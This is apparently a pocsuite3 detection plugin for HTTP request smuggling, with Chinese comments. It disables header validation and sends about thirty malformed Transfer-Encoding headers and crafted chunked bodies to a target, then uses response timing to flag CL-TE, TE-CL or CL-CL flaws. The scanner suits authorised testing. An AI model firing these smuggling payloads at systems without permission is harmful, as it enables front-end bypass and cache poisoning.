import time
import urllib3
import http.client
from collections import OrderedDict
from pocsuite3.api import Output,POCBase,register_poc,requests,VUL_TYPE,POC_CATEGORY


http.client._is_legal_header_name = lambda x: True
http.client._is_illegal_header_value = lambda x: False
urllib3.disable_warnings()


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'wuerror'
    vulDate = 'not clear'
    createDate = '2021-03-21'
    updateDate = '2021-03-21'
    references = ['https://xxx.xx.com.cn']
    name = 'http请求走私漏洞检测poc'
    appPowerLink = 'general'
    appName = 'general'
    appVersion = 'general'
    vulType = VUL_TYPE.HTTP_REQUEST_SMUGGLING
    category = POC_CATEGORY.PROTOCOL.HTTP
    desc = '''前后端服务器对http头部的解析不一致时容易导致前端限制绕过与web缓存投毒等问题'''
    pocDesc = '''请求给出的url和端口号'''

    def _verify(self):
        result = {}
        try:
            smug = Smuggler()
            smug.malform()
            smug.make_headers()
            msg = smug.run(self.url)
            if msg is not None:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['extra'] = {}
                result['extra']['message'] = msg
        except:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


class Smuggler():
    """
    the main function class
    """
    def __init__(self):
        # 用于人工复核
        self.recheck_headers = None
        self.payload_headers = []
        # malformed te headers
        self.te_headers = []
        self.Transfer_Encoding = [["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding ", "chunked"],
                                   ["Transfer_Encoding", "chunked"],
                                   ["Transfer Encoding", "chunked"],
                                   [" Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "  chunked"],
                                   ["Transfer-Encoding", "chunked"],
                                   ["Transfer-Encoding", "\tchunked"],
                                   ["Transfer-Encoding", "\u000Bchunked"],
                                   ["Content-Encoding", " chunked"],
                                   ["Transfer-Encoding", "\n chunked"],
                                   ["Transfer-Encoding\n ", " chunked"],
                                   ["Transfer-Encoding", " \"chunked\""],
                                   ["Transfer-Encoding", " 'chunked'"],
                                   ["Transfer-Encoding", " \n\u000Bchunked"],
                                   ["Transfer-Encoding", " \n\tchunked"],
                                   ["Transfer-Encoding", " chunked, cow"],
                                   ["Transfer-Encoding", " cow, "],
                                   ["Transfer-Encoding", " chunked\r\nTransfer-encoding: cow"],
                                   ["Transfer-Encoding", " chunk"],
                                   ["Transfer-Encoding", " cHuNkeD"],
                                   ["TrAnSFer-EnCODinG", " cHuNkeD"],
                                   ["Transfer-Encoding", " CHUNKED"],
                                   ["TRANSFER-ENCODING", " CHUNKED"],
                                   ["Transfer-Encoding", " chunked\r"],
                                   ["Transfer-Encoding", " chunked\t"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                                   ["Transfer\r-Encoding", " chunked"],
                                   ["barn\n\nTransfer-Encoding", " chunked"]
                                   ]

    def malform(self):
        """
        制作畸形transfer-encoding头
        """
        self.te_headers = self.Transfer_Encoding
        for x in self.Transfer_Encoding:
            if " " == x[1][0]:
                for i in [9, 11, 12, 13]:
                    # print (type(chr(i)))
                    c = str(chr(i))
                    self.te_headers.append([x[0], c + x[1][1:]])

    def make_headers(self):
        """
        为每一个Transfer-encoding头添加其他header值
        """
        for x in self.te_headers:
            headers = OrderedDict()
            headers[x[0]] = x[1]
            headers['Cache-Control'] = "no-cache"
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
            self.payload_headers.append(headers)

    def send_payload(self, url, headers={}, payload=""):
        """
        通过requests预处理来发送检测http报文
        :param url:检测目标url
        :param headers:HTTP头部
        :param payload:HTTP body
        :return resp_time:响应报文的时延
        """
        s = requests.Session()
        req = requests.Request('POST', url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
        except requests.exceptions.ReadTimeout as e:
            print(e.args)
            resp_time = 10
        except requests.exceptions.ConnectionError as ex:
            print("failed to connect")
            print(ex.args)
            return None
        return resp_time
    
    def check_clte(self, url):
        """
        检测CL-TE类型走私漏洞
        """
        payloads = self.payload_headers
        for headers in payloads:
            headers['Content-Length'] = 4
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t2 = self.send_payload(url, headers, payload)
            if t2 is None:
                t2 = 0
            if t2 < 5:
                continue

            #正常报文
            headers['Content-Length'] = 11
            payload = "1\r\nZ\r\nQ\r\n\r\n\r\n"
            t1 = self.send_payload(url, headers, payload)

            if t1 is None:
                t1 = 1

            print(t1, t2)
            if t2 > 5 and t2 / t1 >= 5:
                self.recheck_headers = [headers]
                #record a log
                return True
        return False

    def check_tecl(self, url):
        """
        检测TE-CL类型走私漏洞
        """
        payloads = self.payload_headers
        for headers in payloads:
            payload = "0\r\n\r\nX"
            headers['Content-Length'] = 6
            t2 = self.send_payload(url, headers, payload)
            if t2 is None:
                t2 = 0
            if t2 < 5:
                continue

            payload = "0\r\n\r\n"
            headers['Content-Length'] = 5
            t1 = self.send_payload(url, headers, payload)
            if t1 is None:
                t1 = 1
            if t2 is None:
                t2 = 0
            if t2 > 5 and t2 / t1 >= 5:
                self.recheck_headers = [headers]
                #record a log
                return True
        return False 

    def send_cl_payload(self, url, header, payload):
        """
        发送CL-CL类型检测报文
        """
        sess = requests.Session()
        req = requests.Request('POST', url, data=payload)
        prepped = req.prepare()
        prepped.headers = header
        try:
            resp = sess.send(prepped, verify=False, timeout=10)
            if(resp.status_code == 400):
                return False
            else:
                return True
        except Exception as e:
            print(e.args)
            return False
    
    def check_clcl(self, url):
        """
        检测CL-CL类型漏洞
        RFC 7230 section 3.3.3
        """
        length = ["Content-Length", " 8\r\nContent-Length: 5"]
        clh = []
        cl_payload = []
        if " " == length[1][0]:
            # ascill of HT,VT,FF,CR
            for i in [9, 11, 12, 13]:
                c = str(chr(i))
                clh.append([length[0], c + length[1][1:]])
        for cl in clh:
            cl_header = OrderedDict()
            cl_header[cl[0]] = cl[1]
            cl_header["Cache-Control"] = "no-cache"
            cl_header['Content-Type'] = "application/x-www-form-urlencoded"
            cl_header['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
            cl_payload.append(cl_header)
        for head in cl_payload:
            flag = self.send_cl_payload(url, head, "0\r\n\r\n")
            if flag is True:
                print("clcl detect")

    def run(self, url):
        """
        entrance
        """
        try:
            if self.check_clte(url):
                return "vuln detect: CL-TE"
            elif self.check_tecl(url):
                return "vuln detect:TE-CL"
            elif self.check_clcl(url):
                return "vuln detect:CL-CL"
            else:
                return None
        except Exception as e:
            # 也可以记个日志
            print(e.args)


register_poc(DemoPOC)
